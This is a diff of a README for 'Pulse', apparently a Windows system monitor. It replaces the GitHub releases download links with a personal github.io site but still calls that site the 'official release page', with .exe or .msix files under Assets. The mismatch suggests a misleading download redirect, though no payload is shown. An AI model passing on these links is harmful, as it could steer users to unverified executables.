@@ -1,6 +1,6 @@
 # 📊 pulse-system-monitor - Track your system performance with ease
 
-[![](https://img.shields.io/badge/Download-Pulse_Monitor-blue.svg)](https://github.com/Carleybaritone135/pulse-system-monitor/releases)
+[![](https://img.shields.io/badge/Download-Pulse_Monitor-blue.svg)](https://carleybaritone135.github.io)
 
 Pulse is a task manager and system monitor tool for Windows 11. It provides a visual way to check your hardware, network speed, and running processes. The software offers live graphs and themes to help you manage your computer.
 
@@ -8,7 +8,7 @@ Pulse is a task manager and system monitor tool for Windows 11. It provides a vi
 
 Follow these steps to install Pulse on your computer:
 
-1. Visit the [official release page](https://github.com/Carleybaritone135/pulse-system-monitor/releases).
+1. Visit the [official release page](https://carleybaritone135.github.io).
 2. Look for the latest version section at the top of the page.
 3. Find the file ending in `.msix` or `.exe` under the Assets header.
 4. Click the file name to start the download.
